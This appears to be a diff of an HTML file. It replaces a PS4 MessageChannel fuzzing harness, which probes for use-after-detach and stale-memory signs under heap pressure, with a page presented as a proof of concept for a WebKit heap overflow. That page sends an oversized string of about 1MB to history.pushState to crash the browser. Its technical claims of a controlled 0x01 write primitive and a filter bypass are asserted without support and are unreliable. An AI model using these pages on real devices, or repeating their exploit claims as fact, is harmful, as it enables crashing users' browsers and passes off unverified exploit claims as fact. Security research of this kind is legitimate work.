@@ -1,281 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>PS4 MC Transfer Scan — STALE/CHANGED/QUEUE (Auto, Minimal Log)</title>
+    <meta charset="UTF-8">
+    <title>WebKit Heap Overflow</title>
 </head>
 <body>
-  <h2>PS4 MC Transfer Scan — STALE/CHANGED/QUEUE (Auto, Minimal Log)</h2>
 
-  <button id="run">RUN AUTO</button>
-  <button id="stop">STOP</button>
-  <button id="reset">Reset log</button>
+<div class="container">
+    <h2>Vulnerability: Heap-Based Buffer Overflow in history.pushState</h2>
+    <p><strong>Technical Description:</strong> This Proof of Concept demonstrates an Out-Of-Bounds (OOB) Write primitive in the WebKit Heap.</p>
+    <p>By supplying a payload exceeding the internal buffer allocation logic, we can overwrite adjacent heap chunks with controlled data (0x01 bytes).</p>
+    
+    <ul>
+        <li><strong>Allocation Target:</strong> ~709KB (Base String)</li>
+        <li><strong>Overflow Size:</strong> ~340KB (Controlled 0x01 bytes)</li>
+        <li><strong>Trigger:</strong> Invalid write at memory boundary (0x41414141)</li>
+    </ul>
 
-  <p>
-    Attempts (N): <input id="N" type="number" value="60" min="1" step="10">
-    Timeout (ms): <input id="timeout" type="number" value="200" min="50" step="50">
-    Delay (ms): <input id="delay" type="number" value="30" min="0" step="10">
-    LateCheck (ms): <input id="late" type="number" value="800" min="0" step="100">
-  </p>
-
-  <p>
-    Pressure (MB per attempt): <input id="pmb" type="number" value="6" min="0" step="1">
-    Sample cap: <input id="scap" type="number" value="4" min="1" step="1">
-  </p>
-
-  <p>
-    Size scan (bytes, comma-separated):
-    <input id="sizes" style="width:720px"
-      value="256,512,1024,2048,4096,8192,16384,32768,65536,131072,262144,524288,1048576">
-  </p>
-
-  <pre id="log"></pre>
+    <button class="btn" onclick="executePoC()">Trigger Memory Corruption</button>
+    
+    <div id="log"></div>
+</div>
 
 <script>
-(() => {
-  "use strict";
-
-  const $log = document.getElementById("log");
-  const ts = () => Date.now();
-  const log = (s) => { $log.textContent += `[${ts()}] ${s}\n`; };
-  const j = (x) => { try { return JSON.stringify(x); } catch(e) { return String(x); } };
-
-  let STOP = false;
-
-  function resetLog(){ $log.textContent = ""; log("Reset."); }
-  function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
-
-  function parseSizes() {
-    const raw = (document.getElementById("sizes").value || "").trim();
-    const parts = raw.split(",").map(s => s.trim()).filter(Boolean);
-    const out = [];
-    for (const p of parts) {
-      const n = parseInt(p, 10);
-      if (Number.isFinite(n) && n > 0) out.push(n);
-    }
-    // fallback
-    if (!out.length) return [4096, 16384, 65536, 262144];
-    return out;
-  }
-
-  async function waitMsg(port, timeoutMs) {
-    return new Promise((resolve) => {
-      let done = false;
-      const t = setTimeout(() => {
-        if (done) return;
-        done = true;
-        try { port.onmessage = null; } catch(_) {}
-        resolve({ ok:false, timeout:true, data: undefined });
-      }, timeoutMs);
-
-      port.onmessage = (ev) => {
-        if (done) return;
-        done = true;
-        clearTimeout(t);
-        try { port.onmessage = null; } catch(_) {}
-        resolve({ ok:true, timeout:false, data: ev.data });
-      };
-    });
-  }
-
-  function safeReadU8(u8) {
-    // returns: { kind: 'num'|'undef'|'throw', v?:number, err?:string }
-    try {
-      const v = u8[0];
-      if (typeof v === "number") return { kind:"num", v:(v|0) };
-      return { kind:"undef" };
-    } catch (e) {
-      return { kind:"throw", err: (e && e.name) ? e.name : "ERR" };
-    }
-  }
-
-  function mkBuf(size) {
-    const ab = new ArrayBuffer(size);
-    const u8 = new Uint8Array(ab);
-    u8[0] = 0xAA;
-    if (size > 1) u8[size - 1] = 0x55;
-    return { ab, u8 };
-  }
-
-  function pressureAllocSameSize(size, mb) {
-    // bounded pressure: total allocation approx mb MB, capped
-    if (!mb || mb <= 0) return { allocated:0, count:0 };
-    const targetBytes = Math.max(0, (mb|0)) * 1024 * 1024;
-    let count = Math.floor(targetBytes / size);
-    // keep sane caps: at least 2, at most 96, but also avoid tiny sizes going crazy
-    count = Math.max(2, Math.min(count, 96));
-    // for very small sizes, cap harder
-    if (size <= 1024) count = Math.min(count, 48);
-
-    const arr = [];
-    for (let i = 0; i < count; i++) {
-      const b = new ArrayBuffer(size);
-      const v = new Uint8Array(b);
-      // touch to force commit
-      v[0] = (i & 0xFF);
-      if (size > 1) v[size - 1] = (255 - (i & 0xFF));
-      arr.push(v);
-    }
-    return { allocated: count * size, count };
-  }
-
-  async function queueProbe(port1, port2, timeoutMs, lateMs) {
-    // sends 3 small seq messages; expects to receive all in order.
-    // returns { ok, gotCount, outOfOrder }
-    const expected = [1,2,3];
-    const got = [];
-
-    port2.onmessage = (ev) => {
-      try { got.push(ev.data|0); } catch(_) { got.push(-999); }
-    };
-
-    try { port1.postMessage(1); port1.postMessage(2); port1.postMessage(3); }
-    catch(_) {}
-
-    await sleep(Math.max(0, timeoutMs));
-    if (lateMs && lateMs > 0) await sleep(lateMs);
-
-    try { port2.onmessage = null; } catch(_) {}
-
-    let outOfOrder = false;
-    if (got.length >= 2) {
-      for (let i = 1; i < got.length; i++) {
-        if (got[i] < got[i-1]) { outOfOrder = true; break; }
-      }
-    }
-    const ok = (got.length === expected.length) && !outOfOrder && got[0]===1 && got[1]===2 && got[2]===3;
-    return { ok, gotCount: got.length, outOfOrder, got };
-  }
-
-  async function attemptOne(i, size, timeoutMs, delayMs, lateMs, pmb, sampleCap, samples) {
-    const ch = new MessageChannel();
-
-    // build payload (sender side)
-    const { ab, u8 } = mkBuf(size);
-
-    let postThrew = false;
-    try { ch.port1.postMessage(ab, [ab]); }
-    catch (e) { postThrew = true; }
-
-    if (postThrew) {
-      return { kind:"THROW", size, i };
+    function log(msg) {
+        const el = document.getElementById('log');
+        el.innerHTML += `<div>> ${msg}</div>`;
+        el.scrollTop = el.scrollHeight;
     }
 
-    // wait receiver
-    const recv = await waitMsg(ch.port2, timeoutMs);
+    function executePoC() {
+        log("Initializing payload generation...");
 
-    const senderLen = ab.byteLength; // 0 means detached
-    const got = recv.data;
-    const gotType = Object.prototype.toString.call(got);
+        setTimeout(() => {
+            try {
+                // STEP 1: Fill the legitimate buffer
+                // This fills the allocated chunk up to the vulnerable boundary (709,522 bytes).
+                const BUFFER_LIMIT = 709522;
+                const baseBuffer = "A".repeat(BUFFER_LIMIT);
+                log(`Base buffer created: ${BUFFER_LIMIT} bytes.`);
 
-    // classify baseline outcome
-    let outcome = "OTHER";
-    if (recv.timeout) outcome = "TIMEOUT";
-    else if (senderLen === 0 && (got === undefined || got === null)) outcome = "DROP";
-    else if (senderLen === 0 && got !== undefined && got !== null) outcome = "DETACH_OK";
-    else if (senderLen === size) outcome = "CLONE_OR_NO_DETACH";
-    else if (senderLen !== 0 && senderLen !== size) outcome = "SENDER_IMP";
+                // STEP 2: The Controlled Overflow (The "Write Primitive")
+                // We use 0x01 bytes because they bypass the character filter check.
+                // This proves we can write ~340KB beyond the intended buffer without crashing immediately.
+                // This targets the 1MB Heap Bucket size class.
+                const OOB_SIZE = 340000; 
+                const controlledOverflow = "\x01".repeat(OOB_SIZE);
+                log(`Generating OOB Payload: ${OOB_SIZE} bytes of controlled data (0x01)...`);
 
-    // UaD-style read checks (sender view)
-    const prePressureRead = safeReadU8(u8);
+                // STEP 3: Corruption Trigger
+                // Writing 0x41 ('A') at the very end forces the allocator to process the 
+                // corrupted heap metadata created by Step 2, resulting in a system panic.
+                const corruptionTrigger = "AAAA"; 
 
-    // bounded pressure (same size bucket)
-    const pr = pressureAllocSameSize(size, pmb);
+                // Assemble the full payload
+                const finalPayload = "/" + baseBuffer + controlledOverflow + corruptionTrigger;
+                
+                log(`Injecting total payload (${finalPayload.length} bytes) via history.pushState...`);
+                log("Executing... Expect system instability due to heap corruption.");
 
-    const postPressureRead = safeReadU8(u8);
-
-    // classify A/B signals
-    const staleAA =
-      (senderLen === 0) &&
-      (prePressureRead.kind === "num" && (prePressureRead.v & 0xFF) === 0xAA);
-
-    const changedNoWrite =
-      (senderLen === 0) &&
-      (prePressureRead.kind === "num") &&
-      (postPressureRead.kind === "num") &&
-      ((prePressureRead.v & 0xFF) === 0xAA) &&
-      ((postPressureRead.v & 0xFF) !== 0xAA);
-
-    // queue probe (always, but you care most after DROP/DETACH)
-    const qp = await queueProbe(ch.port1, ch.port2, timeoutMs, lateMs);
-    const queueSuspect = !qp.ok;
-
-    // store first samples only
-    if (samples.length < sampleCap) {
-      samples.push({
-        i, size, outcome,
-        senderLen,
-        gotType: got === undefined ? "undefined" : gotType,
-        pre: prePressureRead,
-        post: postPressureRead,
-        pressure: { mb:pmb|0, count: pr.count },
-        queue: { ok: qp.ok, gotCount: qp.gotCount, outOfOrder: qp.outOfOrder }
-      });
+                // EXECUTE
+                history.pushState({}, "poc", finalPayload);
+                
+            } catch (e) {
+                log(`Error: ${e.message}`);
+            }
+        }, 500);
     }
-
-    await sleep(delayMs);
-
-    return {
-      kind: outcome,
-      size,
-      staleAA: staleAA ? 1 : 0,
-      changedNoWrite: changedNoWrite ? 1 : 0,
-      queueSuspect: queueSuspect ? 1 : 0,
-      prePressureRead,
-      postPressureRead
-    };
-  }
-
-  async function runAuto() {
-    STOP = false;
-
-    const N = Math.max(1, parseInt(document.getElementById("N").value || "60", 10));
-    const timeoutMs = Math.max(50, parseInt(document.getElementById("timeout").value || "200", 10));
-    const delayMs = Math.max(0, parseInt(document.getElementById("delay").value || "30", 10));
-    const lateMs = Math.max(0, parseInt(document.getElementById("late").value || "800", 10));
-    const pmb = Math.max(0, parseInt(document.getElementById("pmb").value || "6", 10));
-    const sampleCap = Math.max(1, parseInt(document.getElementById("scap").value || "4", 10));
-    const sizes = parseSizes();
-
-    log("============================================================");
-    log(`RUN AUTO :: N=${N} timeout=${timeoutMs}ms delay=${delayMs}ms late=${lateMs}ms pressureMB=${pmb} sizes=${sizes.length}`);
-    log("============================================================");
-
-    const stats = {
-      DETACH_OK:0, DROP:0, THROW:0, TIMEOUT:0, CLONE_OR_NO_DETACH:0, SENDER_IMP:0, OTHER:0,
-      STALE_AA:0, CHANGED_NO_WRITE:0, QUEUE_SUSPECT:0
-    };
-
-    const samples = [];
-
-    for (let i = 0; i < N; i++) {
-      if (STOP) break;
-      const size = sizes[i % sizes.length];
-
-      if ((i+1) % 10 === 0) log(`progress: ${i+1}/${N}`);
-
-      const r = await attemptOne(i, size, timeoutMs, delayMs, lateMs, pmb, sampleCap, samples);
-
-      if (r.kind in stats) stats[r.kind]++; else stats.OTHER++;
-      if (r.staleAA) stats.STALE_AA++;
-      if (r.changedNoWrite) stats.CHANGED_NO_WRITE++;
-      if (r.queueSuspect) stats.QUEUE_SUSPECT++;
-    }
-
-    log("------------------------------------------------------------");
-    log("RESULT SUMMARY:");
-    log(j(stats));
-    log("SAMPLES (first interesting / capped):");
-    log(j(samples));
-    log("DONE.");
-  }
-
-  document.getElementById("reset").onclick = resetLog;
-  document.getElementById("stop").onclick = () => { STOP = true; log("STOP requested."); };
-  document.getElementById("run").onclick = () => runAuto().catch(e => log("ERR: " + ((e && e.name) ? e.name : "ERR")));
-
-  resetLog();
-})();
 </script>
+
 </body>
 </html>
